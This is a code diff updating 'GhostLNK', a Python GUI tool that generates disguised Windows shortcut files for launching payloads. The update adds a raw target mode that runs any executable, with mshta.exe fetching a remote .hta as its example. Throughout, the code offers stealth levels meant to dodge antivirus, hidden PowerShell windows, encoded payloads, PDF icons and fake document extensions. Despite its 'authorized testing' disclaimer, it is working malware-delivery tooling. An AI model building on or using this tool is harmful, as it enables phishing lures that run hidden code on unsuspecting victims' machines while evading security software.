@@ -3,7 +3,7 @@
 GhostLNK - Professional LNK Generator with Stealth Mode
 Created by: github.com/Excalibra
 Coded for educational and authorized testing purposes only
-Version: 6.2 - Hidden PowerShell Window Added
+Version: 6.3 - Raw Target Support Added
 """
 
 import os
@@ -395,8 +395,9 @@ class LNKEngine:
         lnk._link_info.local = True
         lnk._link_info.local_base_path = target_path
 
-        # Handle PowerShell hidden window option
-        if hide_powershell and arguments.startswith('-E '):
+        # Handle PowerShell hidden window option (only if target is powershell.exe)
+        is_powershell = target_path.lower().endswith("powershell.exe")
+        if hide_powershell and is_powershell and arguments.startswith('-E '):
             # Add -WindowStyle Hidden but keep existing arguments
             encoded = arguments[3:]
             arguments = f'-WindowStyle Hidden -E {encoded}'
@@ -405,14 +406,14 @@ class LNKEngine:
             # Set window mode based on stealth level
             if stealth_level == 2:
                 # MAXIMUM STEALTH - No suspicious flags, use Minimized window
-                if arguments.startswith('-E '):
+                if is_powershell and arguments.startswith('-E '):
                     encoded = arguments[3:]
                     # Use only -E, no extra flags that trigger AV
                     arguments = f'-E {encoded}'
                 lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
             elif stealth_level == 1:
                 # MODERATE STEALTH - Use -W 1 (Minimized)
-                if arguments.startswith('-E '):
+                if is_powershell and arguments.startswith('-E '):
                     encoded = arguments[3:]
                     arguments = f'-W 1 -E {encoded}'
                 lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
@@ -522,7 +523,7 @@ class GhostLNKGUI(QMainWindow):
 
     def init_ui(self):
         """Initialize the user interface"""
-        self.setWindowTitle("👻 GhostLNK v6.2 - Created by github.com/Excalibra")
+        self.setWindowTitle("👻 GhostLNK v6.3 - Raw Target Support | Created by github.com/Excalibra")
 
         # Get screen geometry
         screen = QApplication.primaryScreen().availableGeometry()
@@ -589,7 +590,7 @@ class GhostLNKGUI(QMainWindow):
         main_layout.addWidget(credit)
 
         # Subtitle
-        subtitle = QLabel("📌 Dropbox: &dl=1 | STEALTH: Avoids suspicious patterns | HIDE: -WindowStyle Hidden option added")
+        subtitle = QLabel("📌 Dropbox: &dl=1 | STEALTH: Avoids suspicious patterns | HIDE: -WindowStyle Hidden | RAW TARGET: Custom EXE")
         subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
         subtitle.setStyleSheet("color: #ffaa00; font-size: 11px; padding-bottom: 5px;")
         main_layout.addWidget(subtitle)
@@ -637,12 +638,12 @@ class GhostLNKGUI(QMainWindow):
         self.statusBar().setStyleSheet("color: #a8a8ff;")
 
         self.create_menu()
-        self.log("👻 GhostLNK v6.2 initialized - Created by github.com/Excalibra")
-        self.log("[✓] Hidden PowerShell Window option added")
-        self.log("[✓] Multiple stealth levels available")
+        self.log("👻 GhostLNK v6.3 initialized - Raw Target Support Added")
+        self.log("[✓] Custom executable target now available")
+        self.log("[✓] Multiple stealth levels + Hidden PowerShell Window")
 
     def create_converter_panel(self):
-        """Create the converter panel"""
+        """Create the converter panel (PowerShell payload builder)"""
         panel = QWidget()
         layout = QVBoxLayout(panel)
         layout.setSpacing(6)
@@ -744,7 +745,7 @@ class GhostLNKGUI(QMainWindow):
         self.debug_cb.toggled.connect(self.update_options)
         options_layout.addWidget(self.debug_cb)
 
-        # Hidden PowerShell Window checkbox (NEW)
+        # Hidden PowerShell Window checkbox
         self.hide_pwsh_cb = QCheckBox("🔒 Hide PowerShell Window (-WindowStyle Hidden)")
         self.hide_pwsh_cb.setChecked(False)
         self.hide_pwsh_cb.toggled.connect(self.update_options)
@@ -860,104 +861,141 @@ class GhostLNKGUI(QMainWindow):
         return panel
 
     def create_lnk_panel(self):
-        """Create the LNK generator panel"""
+        """Create the LNK generator panel with Raw Target support"""
         panel = QWidget()
         layout = QVBoxLayout(panel)
         layout.setSpacing(6)
 
-        # Import -E Argument (with hint)
-        import_group = QGroupBox("Import -E Argument")
-        import_layout = QVBoxLayout()  # Changed to vertical layout
-        input_row = QHBoxLayout()
+        # ---- RAW TARGET MODE ----
+        raw_group = QGroupBox("⚙️ Raw Target Mode (Bypass PowerShell)")
+        raw_layout = QVBoxLayout()
+
+        self.raw_mode_cb = QCheckBox("Enable Raw Target Mode (use custom EXE / command)")
+        self.raw_mode_cb.toggled.connect(self.toggle_raw_mode)
+        raw_layout.addWidget(self.raw_mode_cb)
+
+        # Container for raw target fields (initially hidden)
+        self.raw_widget = QWidget()
+        raw_sub_layout = QVBoxLayout(self.raw_widget)
+        raw_sub_layout.setContentsMargins(10, 5, 10, 5)
+
+        # Target path
+        target_path_layout = QHBoxLayout()
+        target_path_layout.addWidget(QLabel("Target Path:"))
+        self.raw_target_path = QLineEdit()
+        self.raw_target_path.setPlaceholderText("C:\\Windows\\System32\\mshta.exe")
+        target_path_layout.addWidget(self.raw_target_path)
+        browse_btn = QPushButton("Browse...")
+        browse_btn.clicked.connect(self.browse_raw_target)
+        target_path_layout.addWidget(browse_btn)
+        raw_sub_layout.addLayout(target_path_layout)
+
+        # Arguments
+        args_layout = QHBoxLayout()
+        args_layout.addWidget(QLabel("Arguments:"))
+        self.raw_arguments = QLineEdit()
+        self.raw_arguments.setPlaceholderText("/c whoami  or  \"https://example.com/script.hta\"")
+        args_layout.addWidget(self.raw_arguments)
+        raw_sub_layout.addLayout(args_layout)
+
+        # Helpful note and example for arguments
+        note_label = QLabel(
+            "📝 Note: The URL should be enclosed in quotes because it contains no spaces; "
+            "quotes are optional but safe.<br>"
+            "💡 Example: <code>\"https://example.com/script.hta\"</code>"
+        )
+        note_label.setWordWrap(True)
+        note_label.setStyleSheet("color: #aaaaaa; font-size: 9px; margin-left: 5px;")
+        raw_sub_layout.addWidget(note_label)
+
+        # Working directory (optional)
+        workdir_layout = QHBoxLayout()
+        workdir_layout.addWidget(QLabel("Working Dir (optional):"))
+        self.raw_working_dir = QLineEdit()
+        self.raw_working_dir.setPlaceholderText("%TEMP% or C:\\path")
+        workdir_layout.addWidget(self.raw_working_dir)
+        raw_sub_layout.addLayout(workdir_layout)
+
+        self.raw_widget.setVisible(False)
+        raw_layout.addWidget(self.raw_widget)
+        raw_group.setLayout(raw_layout)
+        layout.addWidget(raw_group)
+
+        # ---- PowerShell Import (only relevant when raw mode is off) ----
+        self.import_group = QGroupBox("Import -E Argument (PowerShell Mode)")
+        import_layout = QHBoxLayout()
+
         self.import_input = QLineEdit()
         self.import_input.setPlaceholderText("Paste -E argument here...")
-        input_row.addWidget(self.import_input)
+        import_layout.addWidget(self.import_input)
+
         import_btn = QPushButton("Import")
         import_btn.setMaximumWidth(60)
         import_btn.clicked.connect(self.import_arg)
-        input_row.addWidget(import_btn)
-        import_layout.addLayout(input_row)
+        import_layout.addWidget(import_btn)
 
-        # Hint label
-        import_hint = QLabel("ℹ️ After pasting a base64 string, click Import. -E will be added automatically if missing.")
-        import_hint.setWordWrap(True)
-        import_hint.setStyleSheet("color: #aaaaaa; font-size: 9px;")
-        import_layout.addWidget(import_hint)
-        import_group.setLayout(import_layout)
-        layout.addWidget(import_group)
+        self.import_group.setLayout(import_layout)
+        layout.addWidget(self.import_group)
 
         # Preview
         preview_group = QGroupBox("Payload Preview")
         preview_layout = QVBoxLayout()
-        preview_layout.addWidget(QLabel("Target: C:\\Windows\\System32\\...\\powershell.exe"))
-
+        preview_layout.addWidget(QLabel("Target: (not set)"))
         self.preview_label = QLabel("Arguments: (not set)")
         self.preview_label.setWordWrap(True)
         self.preview_label.setStyleSheet("color: #ffaa00; background-color: #16213e; padding: 3px;")
         preview_layout.addWidget(self.preview_label)
-
         preview_group.setLayout(preview_layout)
         layout.addWidget(preview_group)
 
-        # Icon
+        # Icon Selection
         icon_group = QGroupBox("Icon Selection")
         icon_layout = QVBoxLayout()
-
         self.icon_combo = QComboBox()
         self.icon_combo.addItems(list(self.ICON_DATABASE.keys()))
         self.icon_combo.setCurrentText("PDF Document")
         icon_layout.addWidget(self.icon_combo)
-
         icon_group.setLayout(icon_layout)
         layout.addWidget(icon_group)
 
         # Filename
         file_group = QGroupBox("Output Filename")
         file_layout = QGridLayout()
-
         file_layout.addWidget(QLabel("Base name:"), 0, 0)
         self.filename_input = QLineEdit("Report")
         file_layout.addWidget(self.filename_input, 0, 1)
-
         file_layout.addWidget(QLabel("Extension:"), 1, 0)
         self.ext_combo = QComboBox()
         self.ext_combo.addItems([".pdf", ".doc", ".xls", ".txt", ".ps1"])
         file_layout.addWidget(self.ext_combo, 1, 1)
-
         self.lnk_cb = QCheckBox("Add .lnk extension")
         self.lnk_cb.setChecked(True)
         file_layout.addWidget(self.lnk_cb, 2, 1)
-
         file_group.setLayout(file_layout)
         layout.addWidget(file_group)
 
         # Description
         desc_group = QGroupBox("File Description")
         desc_layout = QVBoxLayout()
-
         self.desc_input = QTextEdit()
         self.desc_input.setMaximumHeight(50)
         desc_layout.addWidget(self.desc_input)
-
         gen_desc_btn = QPushButton("Generate Description")
         gen_desc_btn.setMaximumWidth(120)
         gen_desc_btn.clicked.connect(self.generate_desc)
         desc_layout.addWidget(gen_desc_btn)
-
         desc_group.setLayout(desc_layout)
         layout.addWidget(desc_group)
 
-        # Mode indicator
+        # Mode indicators (only for PowerShell mode)
         self.mode_indicator = QLabel("Current Mode: Download & Open")
         self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
         layout.addWidget(self.mode_indicator)
 
-        # Stealth indicator
         self.stealth_indicator = QLabel("Stealth: Maximum (AV Bypass)")
         self.stealth_indicator.setStyleSheet("color: #88ff88;")
         layout.addWidget(self.stealth_indicator)
 
-        # PowerShell Hide indicator (NEW)
         self.hide_indicator = QLabel("PowerShell Window: Visible")
         self.hide_indicator.setStyleSheet("color: #ffaa00;")
         layout.addWidget(self.hide_indicator)
@@ -971,6 +1009,32 @@ class GhostLNKGUI(QMainWindow):
 
         layout.addStretch()
         return panel
+
+    def toggle_raw_mode(self, enabled):
+        """Show/hide raw target fields and disable PowerShell-specific options"""
+        self.raw_widget.setVisible(enabled)
+        self.import_group.setVisible(not enabled)
+        self.type_combo.setEnabled(not enabled)
+        self.stealth_combo.setEnabled(not enabled)
+        self.pause_cb.setEnabled(not enabled)
+        self.debug_cb.setEnabled(not enabled)
+        self.hide_pwsh_cb.setEnabled(not enabled)
+        if enabled:
+            self.mode_indicator.setText("Current Mode: RAW TARGET (Custom EXE)")
+            self.mode_indicator.setStyleSheet("color: #ffaa00; font-weight: bold;")
+            self.stealth_indicator.setText("Stealth: N/A (raw target)")
+            self.hide_indicator.setText("PowerShell: N/A")
+            self.preview_label.setText("Raw target mode active - fill in target and arguments above")
+        else:
+            self.mode_indicator.setText("Current Mode: Download & Open")
+            self.stealth_indicator.setText(f"Stealth: {['None', 'Moderate', 'Maximum'][self.stealth_combo.currentIndex()]}")
+            self.hide_indicator.setText("PowerShell Window: Visible" if not self.hide_pwsh_cb.isChecked() else "PowerShell Window: HIDDEN")
+            self.update_options()
+
+    def browse_raw_target(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select Target Executable", "C:\\", "Executable Files (*.exe);;All Files (*)")
+        if file_path:
+            self.raw_target_path.setText(file_path)
 
     def create_menu(self):
         menubar = self.menuBar()
@@ -993,6 +1057,31 @@ class GhostLNKGUI(QMainWindow):
         hide_help = QAction("Hidden PowerShell Guide", self)
         hide_help.triggered.connect(self.show_hide_help)
         help_menu.addAction(hide_help)
+
+        raw_help = QAction("Raw Target Guide", self)
+        raw_help.triggered.connect(self.show_raw_help)
+        help_menu.addAction(raw_help)
+
+    def show_raw_help(self):
+        QMessageBox.about(self, "Raw Target Mode Guide",
+            "<b>🎯 Raw Target Mode</b><br><br>"
+            "Use this to generate LNK files that execute any program directly, "
+            "bypassing PowerShell entirely.<br><br>"
+            "<b>When to use:</b><br>"
+            "- You want to run a traditional executable (cmd.exe, rundll32.exe, your own tool)<br>"
+            "- You want to avoid PowerShell detection entirely<br>"
+            "- You need to pass custom arguments that are not PowerShell encoded<br><br>"
+            "<b>How to use:</b><br>"
+            "1. Enable 'Raw Target Mode'<br>"
+            "2. Set the full path to the target executable<br>"
+            "3. Enter any command-line arguments<br>"
+            "4. (Optional) Set a working directory<br>"
+            "5. Choose icon and output name as usual<br>"
+            "6. Generate the LNK file<br><br>"
+            "<b>Example:</b><br>"
+            "Target: C:\\Windows\\System32\\mshta.exe<br>"
+            "Arguments: \"https://example.com/script.hta\"<br><br>"
+            "<b>Note:</b> Stealth options and PowerShell hidden window do not apply in raw mode.")
 
     def update_options(self):
         """Update available options based on selections with visual indicators"""
@@ -1294,14 +1383,8 @@ class GhostLNKGUI(QMainWindow):
     def import_arg(self):
         arg = self.import_input.text().strip()
         if arg:
-            # Add -E prefix if missing
-            if not arg.startswith("-E "):
-                arg = f"-E {arg}"
-            self.import_input.setText(arg)  # Update input with corrected arg
             self.preview_label.setText(f"Arguments: {arg[:100]}...")
             self.log("[✓] Imported argument")
-        else:
-            QMessageBox.warning(self, "Warning", "Please paste a base64 string first.")
 
     def generate_desc(self):
         date = datetime.now().strftime("%d/%m/%Y")
@@ -1318,11 +1401,41 @@ class GhostLNKGUI(QMainWindow):
 
     def generate_lnk(self):
         try:
-            arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
-            if not arg:
-                QMessageBox.warning(self, "Warning", "No -E argument set")
-                return
+            # ---- RAW TARGET MODE ----
+            if self.raw_mode_cb.isChecked():
+                target_path = self.raw_target_path.text().strip()
+                if not target_path:
+                    QMessageBox.warning(self, "Warning", "Raw Target Mode enabled but no target path specified.")
+                    return
+                # Expand environment variables (e.g., %ProgramFiles%)
+                target_path = os.path.expandvars(target_path)
+                arguments = self.raw_arguments.text().strip()
+                working_dir = self.raw_working_dir.text().strip()
+                if working_dir:
+                    working_dir = os.path.expandvars(working_dir)
+                else:
+                    working_dir = None
 
+                # Validate target path exists
+                if not os.path.exists(target_path):
+                    reply = QMessageBox.question(self, "Target Not Found",
+                                                 f"The target '{target_path}' does not exist.\nDo you want to continue anyway?",
+                                                 QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
+                    if reply == QMessageBox.StandardButton.No:
+                        return
+
+                self.log(f"🎯 Raw Target Mode: {target_path} {arguments}")
+            else:
+                # ---- POWERHSELL MODE ----
+                arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
+                if not arg:
+                    QMessageBox.warning(self, "Warning", "No -E argument set (or import one first).")
+                    return
+                target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+                arguments = arg
+                working_dir = None  # Let LNKEngine handle default
+
+            # Common LNK parameters
             icon = self.icon_combo.currentText()
             icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
 
@@ -1341,33 +1454,45 @@ class GhostLNKGUI(QMainWindow):
             if not save_path:
                 return
 
-            mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
-            stealth = self.stealth_combo.currentIndex()
-            stealth_names = ["Normal", "Moderate", "Maximum"]
-            hide = self.hide_pwsh_cb.isChecked()
-
-            self.log(f"👻 Generating LNK ({mode}, Stealth: {stealth_names[stealth]}, Hide PowerShell: {hide})...")
+            # For PowerShell mode, get stealth/hide settings
+            if not self.raw_mode_cb.isChecked():
+                stealth = self.stealth_combo.currentIndex()
+                hide = self.hide_pwsh_cb.isChecked()
+                mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
+                self.log(f"👻 Generating LNK (PowerShell) - Mode: {mode}, Stealth: {['Normal','Moderate','Maximum'][stealth]}, Hide: {hide}")
+            else:
+                stealth = 0
+                hide = False
+                self.log(f"👻 Generating LNK (Raw Target) - Target: {target_path}")
 
             LNKEngine.create_lnk(
                 save_path,
-                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
-                arg,
+                target_path,
+                arguments,
                 icon_path,
                 icon_idx,
                 desc,
+                working_dir=working_dir,
                 stealth_level=stealth,
                 hide_powershell=hide
             )
 
             size = os.path.getsize(save_path)
-            self.log(f"[✓] LNK saved: {os.path.basename(save_path)} ({size} bytes) - Stealth: {stealth_names[stealth]}, Hide: {hide}")
+            self.log(f"[✓] LNK saved: {os.path.basename(save_path)} ({size} bytes)")
 
-            QMessageBox.information(self, "Success",
-                f"LNK file generated successfully!\n\n"
-                f"Path: {save_path}\n"
-                f"Mode: {mode}\n"
-                f"Stealth: {stealth_names[stealth]}\n"
-                f"PowerShell Hidden: {hide}")
+            if self.raw_mode_cb.isChecked():
+                QMessageBox.information(self, "Success",
+                    f"LNK file generated successfully!\n\n"
+                    f"Path: {save_path}\n"
+                    f"Target: {target_path}\n"
+                    f"Arguments: {arguments}")
+            else:
+                QMessageBox.information(self, "Success",
+                    f"LNK file generated successfully!\n\n"
+                    f"Path: {save_path}\n"
+                    f"Mode: {mode}\n"
+                    f"Stealth: {['Normal','Moderate','Maximum'][stealth]}\n"
+                    f"PowerShell Hidden: {hide}")
 
         except Exception as e:
             self.log(f"❌ Error: {str(e)}")
@@ -1448,7 +1573,7 @@ class GhostLNKGUI(QMainWindow):
 
     def show_about(self):
         QMessageBox.about(self, "About GhostLNK",
-            "<b>GhostLNK v6.2</b><br><br>"
+            "<b>GhostLNK v6.3</b><br><br>"
             "<b>Created by: github.com/Excalibra</b><br><br>"
             "Ultimate LNK Generator with:<br>"
             "✓ Multiple payload types<br>"
@@ -1456,8 +1581,8 @@ class GhostLNKGUI(QMainWindow):
             "✓ Hidden PowerShell Window option<br>"
             "✓ AV bypass techniques<br>"
             "✓ Dropbox URL validation<br>"
-            "✓ Realistic icon disguises<br><br>"
-            "<b>New in v6.2:</b> Optional -WindowStyle Hidden for complete invisibility<br><br>"
+            "✓ Realistic icon disguises<br>"
+            "✓ <b>NEW: Raw Target Mode (custom EXE / command)</b><br><br>"
             "⚠️ For authorized testing only")
 
 
